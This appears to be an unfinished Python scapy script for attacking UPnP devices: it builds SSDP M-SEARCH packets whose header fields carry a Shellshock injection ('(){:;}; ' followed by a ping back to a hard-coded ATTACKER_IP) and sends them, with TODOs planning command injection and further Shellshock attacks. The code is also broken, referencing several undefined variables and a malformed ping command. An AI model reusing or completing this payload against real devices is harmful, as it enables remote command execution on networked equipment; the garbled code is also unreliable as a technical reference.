#!/bin/python3
from scapy.all import *

############################
# TODO:
#   - Update to use user input options
#   - Add notify and response functionality
#   - Add command injection attacks
#   - Add additional Shellshock attacks
#   - Add debugging output
############################

# Local Variables
ATTACKER_IP = '192.168.1.12'

# Shell Commands
ping_cmd = 'ping -c -p ssdp_attack ' + ATTACKER_IP

# SSDP Search Settings
ssdp_SEARCH    = '* HTTP/1.1' 
ssdp_SEARCH_ST = 'urn:schemas-upnp-org:device:PEMSTrailer:1'
ssdp_SEARCH_ST_UUID_CMD = 'uuid:' + CMD

# SSDP Notify Settings

# SSDP Response Settings

# Shellshock attacks 
shellShock_ping = '(){:;}; ' + ping_cmd

# Payloads
payload_SEARCH_NORMAL = ("M-SEARCH %s\r\nHOST:%s\r\nMAN:%s\r\nMX:%s\r\nST:%s\r\nUSER-AGENT:%s\r\n\r\n"%(ssdp_SEARCH,ssdp_HOST,ssdp_MAN,ssdp_MX,ssdp_ST,ssdp_USER_AGENT))

payload_SEARCH_SHELLSHOCK = ("M-SEARCH %s\r\nHOST:%s\r\nMAN:%s\r\nMX:%s\r\nST:%s\r\nUSER-AGENT:%s\r\n\r\n"%(ssdp_SEARCH,ssdp_HOST,shellShock,shellShock,shellShock,shellShock))

ssdpReq = IP(dst=ssdp_DST)/UDP(sport=ssdp_PORT,dport=ssdp_PORT)/payload
send(ssdpReq)
